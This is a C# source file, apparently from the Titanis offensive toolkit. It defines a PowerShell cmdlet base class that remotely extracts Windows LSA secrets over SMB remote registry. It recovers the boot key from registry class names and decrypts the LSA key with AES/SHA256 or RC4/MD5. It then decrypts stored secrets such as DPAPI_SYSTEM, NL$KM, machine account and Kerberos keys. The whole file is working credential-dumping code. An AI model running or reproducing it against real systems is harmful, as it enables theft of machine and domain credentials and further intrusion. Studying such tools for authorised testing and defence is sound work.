using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Titanis;
using Titanis.Msrpc.Msrrp;
using Titanis.Winterop;

namespace Titanis.Tbo.Smb2.PowerShell
{
	public abstract class TboRegLsaSecretCmdlet : TboRegCmdlet
	{
		protected const string LsaKeyPath = @"SYSTEM\CurrentControlSet\Control\Lsa";
		protected const string PolicyPath = @"SECURITY\Policy";
		protected const string SecretsPath = @"SECURITY\Policy\Secrets";
		protected const ulong BootKeyByteSwap = 0xEC6B4D50F91273A8;
		protected static readonly string[] BootKeySubkeys = { "JD", "Skew1", "GBG", "Data" };

		protected byte[] ExtractBootKey(IRegistryClient client, CancellationToken cancellationToken)
		{
			var lsaSpec = new RegistryPathSpec(
				RegistryRootKey.LocalMachine,
				RemoteRegistryClient.GetRootName(RegistryRootKey.LocalMachine),
				LsaKeyPath);

			using var lsaKey = OpenRegistryKey(client, lsaSpec, RegistryAccessRights.QueryValue, cancellationToken);

			byte[] bootKey = new byte[16];
			ulong swapKey = BootKeyByteSwap;
			foreach (var subkeyName in BootKeySubkeys)
			{
				var subkeySpec = new RegistryPathSpec(
					lsaSpec.RootKey,
					lsaSpec.RootName,
					CombineSubkeyPath(lsaSpec.SubkeyPath, subkeyName));

				using var subkey = OpenRegistryKey(client, subkeySpec, RegistryAccessRights.QueryValue, cancellationToken);
				var info = subkey.QueryInfo(includeClass: true, cancellationToken).GetAwaiter().GetResult();
				var className = info.ClassName?.TrimEnd('\0');
				if (string.IsNullOrWhiteSpace(className))
					throw new InvalidOperationException($"Registry class for {subkeySpec.KeyPath} is empty.");

				var bytes = BinaryHelper.ParseHexString(className.AsSpan());
				if (bytes.Length < 4)
					throw new InvalidOperationException($"Registry class for {subkeySpec.KeyPath} does not contain 4 bytes.");

				for (int i = 0; i < 4; i++)
				{
					bootKey[(int)(swapKey & 0x0F)] = bytes[i];
					swapKey >>= 4;
				}
			}

			return bootKey;
		}

		protected byte[]? ExtractLsaKey(
			ISmbProviderInfo smb,
			IRegistryClient client,
			byte[] bootKey,
			CancellationToken cancellationToken,
			out string? lsaKeySource)
		{
			lsaKeySource = null;
			byte[]? polEkList = null;
			byte[]? legacy = null;
			try
			{
				polEkList = TryReadPolicySecretValue(client, "PolEKList", cancellationToken);
				legacy = TryReadPolicySecretValue(client, "PolSecretEncryptionKey", cancellationToken);
			}
			catch (NtstatusException ex) when (ex.StatusCode == Ntstatus.STATUS_PIPE_BUSY)
			{
				polEkList = RegistryRetryHelper.Execute(smb, this.ServerName, cancellationToken, session =>
				{
					return TryReadPolicySecretValue(session.Client, "PolEKList", cancellationToken);
				});

				legacy = RegistryRetryHelper.Execute(smb, this.ServerName, cancellationToken, session =>
				{
					return TryReadPolicySecretValue(session.Client, "PolSecretEncryptionKey", cancellationToken);
				});
			}

			if (polEkList != null && polEkList.Length > 0)
			{
				var decrypted = DecryptLsaData(polEkList, bootKey);
				if (decrypted.Length >= 100)
				{
					lsaKeySource = "Policy\\PolEKList";
					return decrypted.AsSpan(68, 32).ToArray();
				}
			}

			if (legacy != null && legacy.Length >= 76)
			{
				var lsaKey = DecryptLegacyLsaKey(legacy, bootKey);
				if (lsaKey != null)
				{
					lsaKeySource = "Policy\\PolSecretEncryptionKey";
					return lsaKey;
				}
			}

			return null;
		}

		protected byte[]? TryReadPolicySecretValue(IRegistryClient client, string name, CancellationToken cancellationToken)
		{
			var keyPath = CombineSubkeyPath(PolicyPath, name);
			var spec = new RegistryPathSpec(
				RegistryRootKey.LocalMachine,
				RemoteRegistryClient.GetRootName(RegistryRootKey.LocalMachine),
				keyPath);

			try
			{
				using var key = OpenRegistryKey(client, spec, RegistryAccessRights.QueryValue, cancellationToken);
				var valueInfo = key.GetValue(null, cancellationToken).GetAwaiter().GetResult();
				return ExtractValueBytes(valueInfo);
			}
			catch (Win32Exception ex) when (IsMissingKey(ex))
			{
				return null;
			}
		}

		protected byte[]? TryReadSecretValue(
			IRegistryClient client,
			string secretName,
			string valueName,
			CancellationToken cancellationToken,
			out DateTime? lastWriteTime)
		{
			lastWriteTime = null;
			var secretChildPath = CombineSubkeyPath(secretName, valueName) ?? valueName;
			var secretPath = CombineSubkeyPath(SecretsPath, secretChildPath);
			var secretSpec = new RegistryPathSpec(
				RegistryRootKey.LocalMachine,
				RemoteRegistryClient.GetRootName(RegistryRootKey.LocalMachine),
				secretPath);

			try
			{
				using var secretKey = OpenRegistryKey(client, secretSpec, RegistryAccessRights.QueryValue, cancellationToken);
				var info = secretKey.QueryInfo(cancellationToken).GetAwaiter().GetResult();
				lastWriteTime = info.LastWriteTime;

				var valueInfo = secretKey.GetValue(null, cancellationToken).GetAwaiter().GetResult();
				return ExtractValueBytes(valueInfo);
			}
			catch (Win32Exception ex) when (IsMissingKey(ex))
			{
				return null;
			}
		}

		protected static byte[]? DecryptLsaSecret(byte[] secretBlob, byte[] lsaKey)
		{
			if (secretBlob.Length == 0 || lsaKey.Length == 0)
				return null;

			if (secretBlob.Length >= 60)
				return DecryptLsaData(secretBlob, lsaKey);

			return null;
		}

		protected static bool TryExtractSecretPayload(byte[] decrypted, out byte[] payload)
		{
			payload = Array.Empty<byte>();
			if (decrypted.Length == 0)
				return false;

			if (decrypted.Length < 8)
				return false;

			if (TryReadLength(decrypted, 0, out var declared))
			{
				if (TrySlice(decrypted, 16, declared, out payload))
					return true;
				if (declared > 0 && declared <= (decrypted.Length - 16) / 2)
				{
					if (TrySlice(decrypted, 16, declared * 2, out payload))
						return true;
				}
			}

			var candidates = CollectPayloadCandidates(decrypted);
			if (candidates.Count > 0)
			{
				var best = candidates[0];
				for (int i = 1; i < candidates.Count; i++)
				{
					if (candidates[i].Score > best.Score)
						best = candidates[i];
				}

				if (TrySlice(decrypted, best.Offset, best.Length, out payload))
					return true;
			}

			payload = TrimTrailingNulls(decrypted);
			return payload.Length > 0;
		}

		protected static string? TryDecodeSecretString(byte[] payload)
		{
			if (payload.Length == 0)
				return null;

			if (payload.Length % 2 == 0)
			{
				try
				{
					var str = Encoding.Unicode.GetString(payload).TrimEnd('\0');
					if (IsLikelySecretText(str))
						return str;
				}
				catch
				{
				}
			}

			try
			{
				var str = Encoding.UTF8.GetString(payload).TrimEnd('\0');
				if (IsLikelySecretText(str))
					return str;
			}
			catch
			{
			}

			return null;
		}

		protected static string? FormatSecretText(string? name, byte[] payload, string? decoded)
		{
			if (payload.Length == 0)
				return decoded;

			if (ShouldHexEncodeSecret(name))
				return payload.ToHexString();

			return decoded;
		}

		protected static bool TrySplitDpapiSecret(string? name, byte[] payload, out string? machineKey, out string? userKey)
		{
			machineKey = null;
			userKey = null;

			if (string.IsNullOrWhiteSpace(name))
				return false;
			if (!name.Equals("DPAPI_SYSTEM", StringComparison.OrdinalIgnoreCase))
				return false;
			if (payload.Length == 0)
				return false;

			byte[] keyPayload = payload;

			if (payload.Length == 44 && BitConverter.ToUInt32(payload, 0) == 1)
			{
				if (TrySlice(payload, 4, 40, out var slice))
					keyPayload = slice;
			}
			else if (payload.Length > 64)
			{
				if (TryReadLength(payload, 0, out var declared) && declared == 64 && TrySlice(payload, 16, declared, out var slice))
				{
					keyPayload = slice;
				}
				else if (TryReadLength(payload, 4, out declared) && declared == 64 && TrySlice(payload, 12, declared, out slice))
				{
					keyPayload = slice;
				}
				else
				{
					keyPayload = payload.AsSpan(payload.Length - 64, 64).ToArray();
				}
			}
			else if (payload.Length > 40 && payload.Length != 64)
			{
				keyPayload = payload.AsSpan(payload.Length - 40, 40).ToArray();
			}

			if (keyPayload.Length != 40 && keyPayload.Length != 64)
				return false;

			int half = keyPayload.Length / 2;
			machineKey = keyPayload.AsSpan(0, half).ToHexString();
			userKey = keyPayload.AsSpan(half, half).ToHexString();
			return true;
		}

		protected static byte[]? ExtractValueBytes(RegistryValueInfo info)
		{
			if (info.Bytes != null && info.Bytes.Length > 0)
				return info.Bytes;
			if (info.TypedValue is byte[] typedBytes && typedBytes.Length > 0)
				return typedBytes;
			return null;
		}

		protected static byte[]? TryReadValueBytes(IRegistryKey key, string name, CancellationToken cancellationToken)
		{
			try
			{
				var valueInfo = key.GetValue(name, cancellationToken).GetAwaiter().GetResult();
				return ExtractValueBytes(valueInfo);
			}
			catch (Win32Exception ex) when (IsMissingKey(ex))
			{
				return null;
			}
		}

		protected static bool IsMissingKey(Win32Exception ex)
		{
			return ex.NativeErrorCode is (int)Win32ErrorCode.ERROR_FILE_NOT_FOUND
				or (int)Win32ErrorCode.ERROR_PATH_NOT_FOUND
				or (int)Win32ErrorCode.ERROR_BAD_PATHNAME;
		}

		protected static byte[] DecryptLsaData(byte[] policySecret, byte[] key)
		{
			if (policySecret.Length < 60)
				return Array.Empty<byte>();

			byte[] shaKey;
			using (var sha256 = SHA256.Create())
			{
				sha256.TransformBlock(key, 0, key.Length, null, 0);
				for (int i = 0; i < 1000; i++)
				{
					sha256.TransformBlock(policySecret, 28, 32, null, 0);
				}
				sha256.TransformFinalBlock(Array.Empty<byte>(), 0, 0);
				shaKey = sha256.Hash ?? Array.Empty<byte>();
			}

			if (shaKey.Length == 0)
				return Array.Empty<byte>();

			using var aes = Aes.Create();
			aes.Mode = CipherMode.CBC;
			aes.Padding = PaddingMode.None;
			aes.Key = shaKey;
			var iv = new byte[16];

			var output = new byte[(policySecret.Length - 60) / 16 * 16];
			int outputOffset = 0;
			for (int offset = 60; offset + 16 <= policySecret.Length; offset += 16)
			{
				using var decryptor = aes.CreateDecryptor(aes.Key, iv);
				var block = decryptor.TransformFinalBlock(policySecret, offset, 16);
				Buffer.BlockCopy(block, 0, output, outputOffset, block.Length);
				outputOffset += block.Length;
			}

			if (outputOffset != output.Length)
				Array.Resize(ref output, outputOffset);

			return output;
		}

		protected static byte[]? DecryptLegacyLsaKey(byte[] policySecret, byte[] bootKey)
		{
			if (policySecret.Length < 76)
				return null;

			byte[] md5Key;
			using (var md5 = MD5.Create())
			{
				md5.TransformBlock(bootKey, 0, bootKey.Length, null, 0);
				for (int i = 0; i < 1000; i++)
					md5.TransformBlock(policySecret, 60, 16, null, 0);
				md5.TransformFinalBlock(Array.Empty<byte>(), 0, 0);
				md5Key = md5.Hash ?? Array.Empty<byte>();
			}

			if (md5Key.Length == 0)
				return null;

			var encrypted = policySecret.AsSpan(12, 48).ToArray();
			var decrypted = Rc4Transform(md5Key, encrypted);
			if (decrypted.Length < 32)
				return null;

			return decrypted.AsSpan(16, 16).ToArray();
		}

		protected static byte[] Rc4Transform(byte[] key, byte[] data)
		{
			byte[] s = new byte[256];
			for (int i = 0; i < s.Length; i++)
				s[i] = (byte)i;

			int j = 0;
			for (int i = 0; i < s.Length; i++)
			{
				j = (j + s[i] + key[i % key.Length]) & 0xFF;
				(s[i], s[j]) = (s[j], s[i]);
			}

			byte[] output = new byte[data.Length];
			int iIndex = 0;
			j = 0;
			for (int k = 0; k < data.Length; k++)
			{
				iIndex = (iIndex + 1) & 0xFF;
				j = (j + s[iIndex]) & 0xFF;
				(s[iIndex], s[j]) = (s[j], s[iIndex]);
				var keyByte = s[(s[iIndex] + s[j]) & 0xFF];
				output[k] = (byte)(data[k] ^ keyByte);
			}

			return output;
		}

		protected static string? CombineSubkeyPath(string? basePath, string childName)
		{
			if (string.IsNullOrEmpty(basePath))
				return childName;
			if (string.IsNullOrEmpty(childName))
				return basePath;
			return $"{basePath}\\{childName}";
		}

		private static bool TrySlice(byte[] data, int offset, int length, out byte[] payload)
		{
			payload = Array.Empty<byte>();
			if (length <= 0 || offset < 0 || offset > data.Length)
				return false;
			if (offset + length > data.Length)
				return false;
			payload = data.AsSpan(offset, length).ToArray();
			return true;
		}

		private readonly struct PayloadCandidate
		{
			public PayloadCandidate(int offset, int length, int score)
			{
				Offset = offset;
				Length = length;
				Score = score;
			}

			public int Offset { get; }
			public int Length { get; }
			public int Score { get; }
		}

		private static List<PayloadCandidate> CollectPayloadCandidates(byte[] decrypted)
		{
			var candidates = new List<PayloadCandidate>();
			int[] lengthOffsets = { 0, 4, 8 };
			int[] payloadOffsets = { 8, 12, 16 };

			foreach (var lengthOffset in lengthOffsets)
			{
				if (!TryReadLength(decrypted, lengthOffset, out var declared))
					continue;

				foreach (var payloadOffset in payloadOffsets)
				{
					if (payloadOffset <= lengthOffset)
						continue;

					AddCandidate(candidates, decrypted, payloadOffset, declared);

					if (declared > 0 && declared <= (decrypted.Length - payloadOffset) / 2)
						AddCandidate(candidates, decrypted, payloadOffset, declared * 2);
				}
			}

			return candidates;
		}

		private static bool TryReadLength(byte[] data, int offset, out int length)
		{
			length = 0;
			if (offset < 0 || offset + 4 > data.Length)
				return false;

			uint value = BitConverter.ToUInt32(data, offset);
			if (value == 0 || value > int.MaxValue)
				return false;

			length = (int)value;
			return true;
		}

		private static void AddCandidate(List<PayloadCandidate> candidates, byte[] data, int offset, int length)
		{
			if (length <= 0 || offset < 0 || offset > data.Length)
				return;
			if (offset + length > data.Length)
				return;

			int score = ScoreCandidate(data, offset, length);
			candidates.Add(new PayloadCandidate(offset, length, score));
		}

		private static int ScoreCandidate(byte[] data, int offset, int length)
		{
			if (offset < 0 || length <= 0 || offset + length > data.Length)
				return int.MinValue;

			int payloadEnd = offset + length;
			int trailingTotal = data.Length - payloadEnd;
			int trailingZero = 0;
			for (int i = payloadEnd; i < data.Length; i++)
			{
				if (data[i] == 0)
					trailingZero++;
			}

			int trailingNonZero = trailingTotal - trailingZero;
			int score = (trailingZero * 2) - trailingNonZero;
			if (length % 2 == 0)
				score += 1;
			score += ScoreUtf16Payload(data, offset, length);
			return score;
		}

		private static int ScoreUtf16Payload(byte[] data, int offset, int length)
		{
			if (length < 2 || length % 2 != 0)
				return 0;

			int printable = 0;
			int control = 0;
			int nulls = 0;
			int charCount = length / 2;
			for (int i = 0; i < charCount; i++)
			{
				int index = offset + (i * 2);
				var value = (ushort)(data[index] | (data[index + 1] << 8));
				if (value == 0)
				{
					nulls++;
					continue;
				}

				char c = (char)value;
				if (char.IsControl(c))
					control++;
				else if (char.IsLetterOrDigit(c) || char.IsPunctuation(c) || char.IsSymbol(c) || char.IsWhiteSpace(c))
					printable++;
				else
					control++;
			}

			int score = (printable * 3) - (control * 3) - nulls;
			if (printable > 0 && control == 0)
				score += 4;
			return score;
		}

		private static bool IsLikelySecretText(string? text)
		{
			if (string.IsNullOrWhiteSpace(text))
				return false;

			int asciiPrintable = 0;
			int controlCount = 0;
			int length = text.Length;

			for (int i = 0; i < length; i++)
			{
				char c = text[i];
				if (c == '\uFFFD')
					return false;
				if (char.IsControl(c) && c != '\r' && c != '\n' && c != '\t')
					controlCount++;
				if (c >= ' ' && c <= '~')
					asciiPrintable++;
			}

			if (controlCount > 0 || asciiPrintable == 0)
				return false;

			double asciiRatio = (double)asciiPrintable / length;
			return asciiRatio >= 0.6;
		}
		protected static byte[] TrimTrailingNulls(byte[] data)
		{
			int length = data.Length;
			while (length > 0 && data[length - 1] == 0)
				length--;
			if (length == data.Length)
				return data;
			return data.AsSpan(0, length).ToArray();
		}

		private static bool ShouldHexEncodeSecret(string? name)
		{
			if (string.IsNullOrWhiteSpace(name))
				return false;

			if (name.Equals("DPAPI_SYSTEM", StringComparison.OrdinalIgnoreCase))
				return true;
			if (name.Equals("NL$KM", StringComparison.OrdinalIgnoreCase))
				return true;
			if (name.Equals("$MACHINE.ACC", StringComparison.OrdinalIgnoreCase))
				return true;
			if (name.StartsWith("Kerberos", StringComparison.OrdinalIgnoreCase))
				return true;
			if (name.StartsWith("DPAPI", StringComparison.OrdinalIgnoreCase))
				return true;

			return false;
		}
	}
}
